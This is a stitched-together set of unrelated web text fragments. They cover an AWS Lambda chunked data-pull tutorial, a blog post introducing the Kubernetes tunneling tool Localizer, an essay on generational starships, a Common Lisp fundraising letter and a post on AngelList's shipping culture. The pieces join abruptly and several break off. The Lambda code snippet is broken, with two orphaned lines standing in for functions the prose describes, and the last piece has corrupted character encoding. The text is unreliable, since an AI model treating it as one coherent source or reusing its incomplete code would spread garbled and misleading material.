<p><strong>Note:</strong> Depending on the size of data and the allocated lambda memory, it may be more efficient to keep data in memory instead of writing to disk and then uploading to S3.</p>
<p>Lets create a folder called <code>dataPull</code> in your project directory and within it a python script called <code>lambda_function.py</code>, starting with the content below</p>
<div><pre><code data-lang="python">CHUNK_SIZE <span>=</span> <span>10000</span>  <span># determined based on API, memory constraints, experimentation</span>

        data <span>=</span> get_data(i, i <span>+</span> CHUNK_SIZE)
        write_to_local(data, i <span>//</span> CHUNK_SIZE)
</code></pre></div><p>In the above code snippet, we have the functions</p>
<ol>
<li><code>get_num_records</code> to simulate the GET call to your API to get the total number of user posts.</li>
<li><code>download_data</code> to make multiple calls to the API and only accessing 10,000 data records per API data pull. This 10,000 is defined as a global variable <code>CHUNK_SIZE</code>. In your project you will need to determine what this size is depending on API stability, memory constraints, network connection and general best practice size for that API.</li>
<li><code>parse_data</code> to convert the json data into a row format string, which gets written to a local file.</li>
<li><code>write_to_local</code> to write the downloaded chunk of data into the local file system. In our case if we have 100,000 records we will generate 10 files name <code>0, 1, 2, 3, 4, 5, 6, 7, 8, 9</code> with the data for user ids <code>0-10000, 10000-20000,...90000-100000</code> correspondingly. Note the local file system location <code>/tmp</code> will only be available for the duration of a single run of your function.</li>
</ol>
<h4 id="concurrency">Concurrency</h4>
<p>In the above snippet, since we are downloading chunks independently we can also make it concurrent using python’s <code>asyncio</code> library. If you are using concurrency be very aware of the number of open connections/ file handlers, etc. You can also manage concurrency at the lambda function level as shown <a href="https://docs.aws.amazon.com/lambda/latest/dg/configuration-concurrency.html?icmpid=docs_lambda_console">here</a>.</p>
<p>Note some API may not provide the exact number of records, instead you will have to query until no more data is available (usually using some sort of <code>search_after</code> query parameter). In such cases concurrency will be difficult to achieve since you will need the output from the previous call to make the next API call. An example of this is <a href="https://www.elastic.co/guide/en/elasticsearch/reference/6.8/search-request-search-after.html"><code>ElasticSearch's</code> search_after</a>. There is also the <code>from, size</code> type API endpoints which requires the size of data to pull and an id from which to start pulling data as query parameters to the API call.</p>

<p>Since lambda functions are temporary, so are their local storage. We need to make sure our locally stored data (at <code>/tmp</code>) gets stored in a persistent storage system such as <code>AWS S3</code>. Add the below code to <code>lambda_function.py</code>.</p>

<p><strong>Not interested in the back story? </strong>Jump ahead to <a href="#introducing-localizer">Introducing Localizer</a><strong>.</strong></p><p>Before we get into the details of what localizer is and how it came to be, it's crucial that we look at what developer environments were and the motivations behind the ones I create.</p><p>Ever since I wrote my first ever <a href="https://github.com/staymarta/dev">developer environment</a> for the now-defunct <a href="https://github.com/staymarta">StayMarta</a>, I've always focused on one thing: ease of use. For a docker-compose based development environment, this was a relatively simple task. Create Docker containers, write a compose file, declare ports, and they'd be available on my local machine. It was as simple as <code>docker-compose up</code>. While this approach didn't necessarily match what production looked like, it was really the best option available for containers at the time. Options that exist now, such as Kubernetes, weren't available, which rendered <a href="https://www.docker.com/blog/announcing-docker-machine-swarm-and-compose-for-orchestrating-distributed-apps/">equality between production and development a work-in-progress dream</a>.</p><p>Fast forward to 2017, at my first larger-scale startup, <a href="https://azuqua.com/">Azuqua</a>, I had a chance to reimagine what a developer environment looked like under a whole new set of constraints. While Docker Compose works for small teams, it falls apart when you map it to production systems. At the time, our production system was based on Chef. Docker Compose doesn't map to Ruby-based Chef configuration files. When I joined Azuqua, the pain around having separate tooling for infrastructure had become incredibly clear. It wasn't sustainable to have an entire team; write the configuration for our services, communicate with developers why infrastructure can't infinitely scale without good software design, and do it all without blame or single points of failure. Fundamentally this is why I take issue with DevOps teams and prefer promoting the <a href="https://sre.google/">Google SRE Model</a> instead. While at Azuqua, we started a transition to an SRE model and used Kubernetes as a way to help facilitate that.</p><figure><img src="https://blog.jaredallard.me/content/images/2020/12/kind-1.png" alt="KinD Logo"></figure><p>While at Azuqua, I identified the need to run Kubernetes to ease cloud resources' scalability and improve the developer experience. At the same time, this <strong>drastically decreased the developer experience</strong>. While this may seem contradictory at first, it's essential to consider the multiple ways that developer experience presents itself. While at first, it may seem like it's just tooling to test/write code, it's a combination of testing code, writing code, and deploying that code. With the Docker Compose environment at StayMarta, we made the test/build cycle incredibly simple but shifted the deploy aspects onto a bespoke team, the DevOps model. That approach works for small teams, but as you grow, this quickly doesn't scale. If you can't deploy code efficiently, the developer experience is frustrating and promptly turns to an unhealthy relationship with the team responsible for that cycle.</p><p>Going back to how Kubernetes <em>improved the developer experience</em>, which I assure you it does. The benefit to Kubernetes was that it brought a control plane into the mix and focused on being just a container orchestrator. The DSL it does have is highly specific to orchestrating containers and making them work. The control-plane allows self-healing and building tooling to enable all different types of use-cases consistently. While it lacks abstractions, it brings something to developers they've never had before, the ability to deploy code reproducibly. With the introduction of <a href="https://minikube.sigs.k8s.io/docs/">minikube</a>, <a href="https://kind.sigs.k8s.io/docs/">KinD</a>, and others, you could now run the same stack you run in production, but locally.</p><p>The ability to reproducibly deploy helps both deployment confidence and the amount of time needed to get from nothing to running in production. However, it's not without its faults. Whenever you start moving deployment tooling onto developers, you've decreased the developer experience. It's unavoidable because you're introducing net new materials, DSLs, and more for the developers to learn. While <a href="https://kind.sigs.k8s.io/docs/">KinD</a> and <a href="https://minikube.sigs.k8s.io/docs/">minikube</a> are great projects, they all suffer from needing developers to understand how to work with Kubernetes. You need to be able to build a Docker image, push the docker image into the cluster, delete the application pod, verify if it's even using the correct tag, wait for Kubernetes to recreate the container, and make sure you've configured an ingress route to access it outside of your cluster or use <code>kubectl port-forward</code> to access it. The second that breaks, you're now required to dig into why service connectivity isn't working, why your Docker image isn't in the <code>containerd</code> cache, or other not so easily solved areas. While to someone who's worked with Kubernetes for years now, this isn't very difficult, this is hardly achieving the "ease of use" goal I have.</p><p>Solving these problems is not easy. Debugging Kubernetes is difficult and requires knowledge that can only be solved with education, more tooling, or a combination of both. Unfortunately, these are not cheap. Education is hard to do correctly and tends to result in lots of time writing quickly out of date material that is hard to maintain. While at Azuqua, we encountered this same problem. Very few engineers wanted to learn Kubernetes or invest time in the technology around it. We decided to go back to the basics and focus on a tooling based approach. How do we get the same developer experience level, at a minimum, of Docker Compose with Kubernetes? Our answer ended up being a tool called <a href="https://telepresence.io/">Telepresence</a>. Telepresence describes itself as:</p><blockquote>[...] an open source tool that lets you run a single service locally, while connecting that service to a remote Kubernetes cluster.<p><a href="https://www.telepresence.io/discussion/overview">https://www.telepresence.io/discussion/overview</a></p></blockquote><p>It seemed perfect, a tool that enabled your local machine to act as if it were running in Kubernetes and allow your services to be targeted from inside of Kubernetes. We rolled it out at Azuqua after initial tests showed it worked well, and we went with it. Unfortunately, it didn't last.</p><p>While Telepresence solved the problem of communicating with our local Kubernetes cluster, it spectacularly failed at letting services inside the cluster talk to our local services. When it worked, it worked amazingly, but nine times out of ten, it'd fail in a magnitude of ways. Whether that's failing to clean up after random crashing or slowly taking down the computer's internet connection, it generally wouldn't work. Luckily for us at Azuqua, we had a pretty well-defined system for service discovery and few services that needed to talk to one another directly. The few that needed that could just run outside of the cluster. That allowed us to accept those pains and be successful with Telepresence. To be clear, this is not a hit on Telepresence. It worked very well for us at Azuqua, but it's not a complete solution.</p><p>When I started developing a new development environment for <a href="https://outreach.io/">Outreach</a>, I again tried to use Telepresence as the solution to bridge the gap between our local cluster and our local machine. Unfortunately, it didn't work. We did not have a well-defined service discovery mechanism to work around the bugs, we had a much larger engineering team, and almost all services needed to talk to each other. We found more and more edge cases with Telepresence, and our developer experience was suffering. Our NPS score for our developer environment was at a low of -26, just because of Telepresence!</p><figure><img src="https://blog.jaredallard.me/content/images/2020/12/image-1.png" alt="Chart showing the NPS spread"><figcaption>For comparison, a good NPS is generally +30...&nbsp;</figcaption></figure><p>It was pretty clear that Telepresence was not going to solve our use-cases. It was time to look into alternatives.</p><p>Telepresence was interesting since it used a VPN to give you access to your resources. However, it also required a hack DNS injector component, which tended to be the primary source of network problems. There weren't many projects out there that seemed to solve this, but one interesting one was <a href="https://github.com/txn2/kubefwd">kubefwd</a>. If you're not aware of Kubernetes port-forwarding, there is a command that allows you to bring down a set of ports for a given service and have them be available on your local machine via <code>kubectl port-forward</code>. Think of the <code>-p</code> argument to <code>docker run</code>, but for Kubernetes. Unfortunately, this didn't support FQDNs (<code>.svc.cluster.local</code>), statefulsets, or all namespaces automatically. It also didn't support reverse tunneling. I wanted to keep the spirit of Telepresence by continuing to be a one-stop tool. Aside from <code>kubefwd</code>, there were seemingly no tools that could do this. Reverse tunneling into Kubernetes alone seemed to be an unsolved problem. To fill that gap, I decided to write <code>localizer</code>.</p><p><a href="https://github.com/jaredallard/localizer">Localizer</a> is a rewrite of Telepresence in Golang, but without the complex surface area. Its goal is to be a simple, no-frills development tool for application developers using Kubernetes. It does this by being easy to use, self-explanatory, and easy to debug. Localizer only supports what Kubernetes networking does, and acts as a daemon. This is most useful when trying to expose multiple services, developers generally had to have many terminal windows to run Telepresence or other reverse tunnel solutions. Localizer moves away from that by having all commands send a gRPC message to the daemon. More on that later. At the core of Localizer is three commands.</p><h2 id="default-creating-tunnels">Default: Creating Tunnels</h2><figure><img src="https://blog.jaredallard.me/content/images/2020/12/Screen-Shot-2020-12-04-at-1.28.31-PM-1.png" alt="Output from running the localizer daemon"><figcaption>Running <code>localizer</code> on my home Kubernetes Cluster (it's not limited to just local developer environments)</figcaption></figure><p>When you run <code>localizer</code> without any arguments, it automatically creates port-forwards for all Kubernetes Services (this is important), a loopback-interface powered IP address, and adds them to <code>/etc/hosts</code>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
        <p>We have the wrong idea about future space travel. Our current technology has conditioned us to believe in spaceships as a sterile affair, all metals and plastics. This works for getting to the Moon and back, but if you’re like me that’s not good enough. The frontier beyond the Moon, beyond the Solar System–<em>this</em> is what calls to us.</p>
<p>When one commits to this, one realizes this is going to be a one-way affair. The stars are simply too far away and there will never be any warp drive. When we settle out on our beautifully &amp; brutally precisioned ox cart, our starship and our families will be our home until we pass.</p>
<p>Our starship is so brutally precisioned because it must be. Every single ounce of matter costs an incredible amount of fuel i.e. stored energy to move into space. As the posters on our walls remind us:</p>
<p><img src="http://www.counterengineer.com/images/futurepastcaptaindemingsmaller.png" alt=""></p>
<p>What <em>is</em> aboard a starship is an <em>ecosystem</em>.</p>
<p>☉</p>
<p>There is little waste in a properly functioning ecosystem. The energy that flows into the system is minimally wasted. The ecosystem persists by dissipating energy (mainly the sun’s radiation) through the component parts of the ecosystem (bacteria plants animals you). The material components of these cycle in a carefully coordinated pattern powered by the sun.</p>
<p>Say you have a camera, and this camera is affixed to a single atom of nitrogen in violation of all laws of science. We would see this atom of nitrogen float around the atmosphere and down onto the soil until it gets caught up in, say, a rhizobacteria. This rhizobacteria uses a little bit of stored energy to take up that nitrogen and uses it to maintain itself. We follow this bacteria around until it tragically dies. The nitrogen is  absorbed by a nearby plant, once more made a part of a larger former until again tragically–but in a slightly higher register of tragedy–it dies when it is harvested by humans for food. On ingesting the plant, that bit of nitrogen (plus all of the plants stored energy e.g. sugars) becomes stuck up inside some dude. This dude uses the stored energy to order the nitrogen into some nucleotide, say adenine–the A in ATCG. Our camera now watches DNA.</p>
<p>In the most tragic scene of all the human dies slipping on a banana peel.</p>
<p>Buried in the ground, another bacteria munches up the DNA and respires it back into the atmosphere. The dance begins anew.</p>
<p>Implicitly given the brutal complexity of the processes just described: the dancers must dance <em>well</em> for all the structures to link harmoniously.</p>
<p>☉</p>
<p><img src="http://www.counterengineer.com/images/pastoralringworldCLEAN-SM.jpg" alt=""></p>
<p>On the frontier there is always the possibility that we don’t make it. Danger forms a bond between every resident of a starship, and this danger means we indefinitely maintain the systems that work. This is not an easy task. The size and complexity of a starship that carries tens of thousands of people meants there are always <em>things to do.</em> Still, we also know these systems bring human flourishing: the sense that the residents are safe and well while maintaining these systems. It is this that enables the whole thing, the starship, to subsist indefinitely.</p>
<p>It turns out there is plenty of material from the past on how to do this.</p>
<p>Not much changes in these multi-generational starships. The labs occasionally figure out some whiz-bang new tool for the men to gawk over (“With this we can save a couple of microJoules powering propulsion, allowing us to play <em>Mario Kart 64</em>") but they manage to mostly keep this to themselves.</p>
<p>☉</p>
<p>You’re incredulous, that such a feat could be accomplished. From your perspective mailing every citizen something is an impossible task. Here’s the thing: we couldn’t get this starship in the air and then figure out how to make it run well, no. We first constructed starships on Earth, socities that lasted long enough to propel themselves off.</p>
<p>☉</p>
<p>Some back of the envelope calculations: a <a href="https://en.wikipedia.org/wiki/Stanford_torus">stanford torus</a> with a ring 60 km in diameter and 3 km in width yields ~34 square kilometers of land. A small town and the surrounding supporting country.</p>
<p>The seeding of the first starship proceeds uneventfully. Someone posts on the internet, “Hey, I think it would be a good idea if people interested in building starships all moved to the same town.” Out of all the people on the entire internet, about 10 other people were willing to put this into practice. As it turns out, that is all it took.</p>
<p>The value of living with a multi-generational telos becomes apparent over multiple generations. The town becomes its own ecosystem, producing what it needed to survive locally. The town’s research institution focuses on the dual tasks of maximizing local flourishing while minimizing waste and getting all of it into space. Other towns join in, split, fuse.</p>
<p>One starts on the Moon, the efforts of the “Moonbelt”: USS Tulsa OK, USS Vinita OK, USS Pittsburg KS.</p>
<p>Before long, you can make out <em>it</em> with your telescope, the skeleton of one that goes to Mars.</p>
<p><img src="http://www.counterengineer.com/images/moonring.png" alt=""></p>
<p>☉</p>
<p>Hey, I think it would be a good idea if people interested in building starships all moved to the same town.</p>

I put up the <a href="https://app.rarible.com/token/0xd07dc4262bcdbf85190c01c996b4c06a461d2430:90048:0x2587f15fecf9709b1be62349dc67b91f57694e5f">Pastoral Ringworld work as an NFT</a>, and if you’d like to support me, buy one of ‘em!

        <p><a href="https://github.com/sponsors/Hexstream" target="_blank">I am trying to kickstart the Common Lisp revolution from 28 november to <strong>10 december 2020</strong></a>, and as of 5 december 2020, it did look like we were going to run out of time, so this is my last-ditch attempt at rectifying the situation before it's too late. <strong><em><a href="https://github.com/sponsors/Hexstream" target="_blank">Please support the Common Lisp Revival 2020 Fundraiser!!!</a></em></strong></p>

        <p>
          Since we are on such a tight deadline, I am soliciting donations of <strong>1000$ or more</strong> from the following organizations and people. This is the only way we can realistically make it in time.
          <br>
          I can confirm that they are all eligible for <a href="https://sponsors.hexstreamsoft.com/about/#perks" target="_blank">Advanced Perks</a>, including <a href="https://sponsors.hexstreamsoft.com/about/#lifetime-perks" target="_blank">Lifetime Perks</a>.

          <br>
          Also <strong>beware of prorating</strong>, which might significantly cut down your contribution if you are not careful. Any prorating will be announced on the checkout page, and you may need to sponsor at a higher tier to arrive at the amount that you intended to contribute.

        <p>Dear LispWorks, Dear Usha, Dear Franz, Dear Jans,</p>

        <p>
          One of the biggest divisions within the Common Lisp community remains largely unacknowledged. That is <strong>the division between <em>Open Source and Proprietary</em></strong>.
          <br>
          There is tremendous untapped, latent energy to unlock to help make Common Lisp successful, and we just need a slight paradigm shift to do so.
        </p>

        <p>
          <a href="https://twitter.com/HexstreamSoft/status/1213964177657794577" target="_blank" rel="noreferrer">We can make Common Lisp a top 5 programming language by 2040</a>, and this will be much easier to achieve if we unify our forces.
          <br>
          <strong><a href="https://cv.hexstream.expert/" target="_blank">Through my work</a>, I am working to dramatically expand the Common Lisp community, which is guaranteed to greatly benefit your business</strong>.</p>

        <p>
          <strong>You could boost my productivity almost beyond imagination just by providing me a tiny fraction of a normal salary!</strong>
          <br>
          For instance, 1000$/month would be basically infinite money in my current situation. How about you each contribute 500$/month for 6 months as a trial?
          <br>
          Of course, please consider starting with a large donation to the <a href="https://github.com/sponsors/Hexstream" target="_blank">Common Lisp Revival 2020 Fundraiser</a> before <strong>10 december 2020</strong>, as GitHub will double your contribution!
        </p>

        <p>
          I also urge you to open source more of your technology, not even necessarily out of pure generosity, but simply because it makes so much business sense!
          <br>
          For instance, you could send SHOCKWAVES throughout the world simply by open sourcing <a href="http://www.lispworks.com/products/capi.html" target="_blank">CAPI</a> and <a href="https://allegrograph.com/products/allegrograph/" target="_blank">AllegroGraph</a>!
          <br>
          Inherently, the more you open source, the more you stand to benefit from the great Open Source Marketing Machine!
        </p>

        <p>In fact, I almost wonder if you should also open source LispWorks and Allegro Common Lisp and transform yourself into a services company like Red Hat? It's really hard to compete with world-class open source implementations like <a href="http://sbcl.org/" target="_blank">SBCL</a> these days. But obviously, this would be a more long-term project, and I don't presume to understand your business better than you do or tell you what to do. I'm just suggesting ideas. We stand to greatly benefit from a healthy exchange of ideas.</p>

        <p>I have reason to believe that your understanding and appreciation for <a href="https://cv.hexstream.expert/" target="_blank">my crucial work within the Common Lisp community</a> has only been growing since this historic event.</p>

        <p>I believe you have the necessary knowledge and resources to be a key ally in <a href="https://github.com/sponsors/Hexstream" target="_blank">leading Common Lisp to unprecedented success</a>.</p>

        <p>You are already managing <a href="https://www.common-lisp.net/" target="_blank">common-lisp.net</a> and <a href="https://www.cliki.net/" target="_blank">cliki.net</a>, both crucial resources. It is time to unify our efforts. I <a href="https://twitter.com/HexstreamSoft/status/1250142510267224065" target="_blank" rel="noreferrer">again</a> urge you to move to GitHub, the best open source platform, and the <a href="https://github.com/sponsors/Hexstream" target="_blank">Common Lisp Revival 2020 Fundraiser</a> is a great occasion to demonstrate to the world what already ought to be quite obvious: <a href="https://github.com/" target="_blank">GitHub</a> is the best code hosting platform, and <a href="https://github.com/sponsors" target="_blank">GitHub Sponsors</a> is the best open source funding platform! Let's leave <q>avoid success at all costs</q> to Haskell!</p>

        <p>Dear Paul Graham, Dear Y Combinator,</p>

        <p><a href="https://cv.hexstream.expert/" target="_blank">I have been almost entirely dedicating my life to Common Lisp since mid-2006</a> when I discovered Common Lisp, largely thanks to <a href="http://www.paulgraham.com/" target="_blank">your essays</a>, especially <a href="http://www.paulgraham.com/avg.html" target="_blank">Beating the Averages</a>. After spending 2 weeks reading your essays and researching Common Lisp, I went all-in on Common Lisp and completely abandoned Java. <strong>To this day, this has been the best and most determinant event in my life and I am deeply thanking you for it!</strong></p>

        <p>Basically, I've been running <a href="https://www.hexstreamsoft.com/" target="_blank">an unregistered Common Lisp startup</a> for 14 years. I am planning to register in 2022 at the latest. I have finally started experiencing <a href="https://cv.hexstream.expert/#hexstreamsoft-alexa-stats" target="_blank">some visible success</a> this year, as I am finally reaching the interesting point in the exponential curve. <strong>I am requesting your help to further accelerate and embolden this process.</strong></p>

        <p>
          Unfortunately, I believe the traditional Y Combinator process would not be a good fit for me, due to various reasons.
          <br>
          I am requesting a fairly insignificant amount of funding compared to your usual investments, but this would completely change my life.
        </p>

        <p><a href="https://github.com/sponsors/Hexstream" target="_blank">I am the chief architect of the looming Common Lisp revolution.</a> The revolution would still happen even if you just decided to watch it unfold from afar, but I thought I would highlight your opportunity to lend it a bit of your vast resources and influence, thereby greatly empowering it. Everyone has much to gain from this happening. This is a traditional win-win-win scenario.</p>

        <p>I trust that your world-class expertise in startups will easily detect the amazing intrinsic value and potential of me and my startup.</p>

        <p><strong>Please make a large donation to <a href="https://github.com/sponsors/Hexstream" target="_blank">the Common Lisp Revival 2020 Fundraiser</a> <em>before 10 december 2020</em> if you wish to help kickstart the Common Lisp revolution right now! Thank you.</strong></p>

        <p>Dear Ergodox/ZSA, Dear Erez, Dear Tisha, Dear Florian,</p>

        <p>The <a href="https://ergodox-ez.com/pages/planck" target="_blank">Planck EZ</a> is truly revolutionary and life-changing! I predict that it (or its close descendants) will remain the best keyboard on the planet for decades to come!</p>

        <p>Thank you for implementing custom labels in <a href="https://configure.ergodox-ez.com/planck-ez/layouts/ABWNG/latest/0" target="_blank">Oryx</a>, <a href="https://twitter.com/HexstreamSoft/status/1237462417577295873" target="_blank" rel="noreferrer">as I requested</a>. Your email support is truly amazing, and I was surprised to find that indeed, we have already exchanged <strong>more than 100 emails in 9 months!</strong> I greatly value our great relationship, and here is a perfect occasion to go to the next level!</p>

        <p>
          The <a href="https://ergodox-ez.com/pages/planck" target="_blank">Planck EZ</a> is so damn great that I couldn't resist making <a href="https://status-quo.hexstream.expert/hardware/planck-ez/#my-config" target="_blank">an advanced presentation for my custom keyboard layout</a>.
          <br>
          You were so impressed with it that you quickly offered to <a href="https://status-quo.hexstream.expert/articles/planck-ez-interview/" target="_blank">interview me</a>, and I then proceeded to really pour my soul into that article, with quite impressive results I might say!</p>

        <p>
          The kicker? <strong>I did this while I was already late to launch <a href="https://github.com/sponsors/Hexstream" target="_blank">the Common Lisp Revival 2020 Fundraiser</a>! <em>Oh noes!!</em></strong> 🤣
          <br>
          But seriously, I just <em>couldn't wait</em> to share my passion for the <a href="https://ergodox-ez.com/pages/planck" target="_blank">Planck EZ</a> with the world! That's how goddamn amazing it is!!
        </p>

        <p>I had already been using the TypeMatrix 2030 (a somewhat similar keyboard) for more than a decade, and the <a href="https://ergodox-ez.com/pages/planck" target="_blank">Planck EZ</a> is at least 20x better! It's easy to infer that I'm probably going to stick to the <a href="https://ergodox-ez.com/pages/planck" target="_blank">Planck EZ</a> or a close descendant for the next decade at least... As <a href="https://status-quo.hexstream.expert/articles/planck-ez-interview/#alternative-to-qmk" target="_blank">previously stated</a>, I am planning to build much more powerful alternatives to <a href="https://qmk.fm/" target="_blank">QMK</a>, <a href="https://ergodox-ez.com/pages/wally" target="_blank">Wally</a> and <a href="https://configure.ergodox-ez.com/" target="_blank">Oryx</a>, all written in Common Lisp, of course. Admittedly, it would take at least a few years before I can start working on this, due to <a href="https://roadmap.hexstreamsoft.com/" target="_blank">more pressing priorities</a>. My <a href="https://status-quo.hexstream.expert/hardware/planck-ez/#my-config" target="_blank">awesome Planck EZ layout presentation</a> is already a good first step towards an Oryx alternative, although it is not yet written in Common Lisp. (I would probably only support the <a href="https://ergodox-ez.com/pages/planck" target="_blank">Planck EZ</a>, since that's the only keyboard I find interesting...) <strong><a href="https://status-quo.hexstream.expert/articles/planck-ez-interview/#stenography" target="_blank">I believe the Planck EZ will be the key to unlocking 100x productivity!</a></strong></p>

        <p>
          I think there is already an inherent and fundamental link between Common Lisp and the <a href="https://ergodox-ez.com/pages/planck" target="_blank">Planck EZ</a>:
          <br>
          <em>It's only fair to expect that the best programmers would gravitate not only towards the best programming language, but also the <a href="https://ergodox-ez.com/pages/planck" target="_blank">best keyboard</a>!</em>
          <br>
          Thankfully, we have a tremendous opportunity to make that connection even more concrete today!
        </p>

            <p>
Naval Ravikant, founder of AngelList, describes his companyâ€™s shipping culture in one of his <a href="https://nav.al/build-a-team-that-ships">blog posts</a>. 
</p>
<p>
They like to keep projects to one person. And every person is responsible for shipping something every single week. 
</p>
<p>
Itâ€™s quite a polarizing culture. So much so that Naval makes explicit that their environment is wrong for most people. Theyâ€™re looking for independent people who can ship code and if you donâ€™t fit that type, you should go look elsewhere:
</p>


<blockquote>
    If they canâ€™t ship, release them. Our environment is wrong for them. They should go find someplace where they can thrive. Thereâ€™s someplace for everyone.
    <span>Naval Ravikant</span>
</blockquote>

<p>
I wish more companies would do this. When youâ€™re able to clearly outline your values, you tend to attract individuals that stick. 
</p>
<p>
And sometimes, itâ€™s just as important to list all the reasons why someone <em>wouldnâ€™t enjoy</em> working at a company as it is to list everything good about the company. 
</p>
<p>
Hereâ€™s an example from <a href="https://www.notion.so/Join-Levels-Remote-Head-of-Marketing-Growth-6e64dba240404eaea9160a48f1c5f24f">Levels Healthâ€™s</a> recent job description:

<p>
Information like this is gold dust. Think about the countless <em>years</em> people waste working at companies that theyâ€™re not suited for. 
</p>
<p>
For instance, the role above would be a bad fit for me. Iâ€™m at a stage of my career where mentorship would be helpful and Iâ€™d like to execute on projects that are clearly defined in scope. 
</p>
<p>
If a company is not able to explain to me what would make someone a bad candidate for the role, then that would worry me. If youâ€™re not able to eliminate <em>anyone</em> for a role, then the job position itself has likely not been set up for success. 
</p>
<h2>Build a team that ships</h2>


<p>
I want to talk a bit more about AngelListâ€™s prolific shipping culture.
</p>
<p>
It reminds me of a ceramics experiment that was done (can be traced back to this <a href="https://www.amazon.com/dp/0961454733/?tag=codihorr-20">book</a>) in which the teacher divided the class into two groups. 
</p>
<p>
One group would be graded solely on the quantity of work they produced, whilst the other solely on its quality.
</p>
<p>
The grading procedure was simple:
</p>
<p>
<em>â€œOn the final day of class, the instructor would bring in his bathroom scales and weigh the work of the "quantity" group: fifty pound of pots rated an "A", forty pounds a "B", and so on. Those being graded on "quality", however, needed to produce only one pot - albeit a perfect one - to get an "A".â€�</em>
</p>
<p>
Fast forward to grading time. Can you guess what happened? 
</p>
<p>
It turns out that the works of highest quality were all produced by the group being graded for quantity:
</p>
<p>
<em>â€œIt seems that while the "quantity" group was busily churning out piles of work - and learning from their mistakes - the "quality" group had sat theorizing about perfection, and in the end had little more to show for their efforts than grandiose theories and a pile of dead clay.â€�</em>
</p>
<p>
Naval acknowledges that shipping at the velocity they do is not ideal. They make mistakes and many of the features they release are half-baked. 
</p>
<p>
But it is also precisely <em>because</em> they ship so much that theyâ€™re able to get it right. Just like the â€œquantityâ€� group, the engineers at AngelList are constantly iterating and testing out their assumptions. 
</p>
<p>
Rather than always being in paralysis mode, they just build the damn thing. And if it doesnâ€™t work, they try again until it does. 
</p>
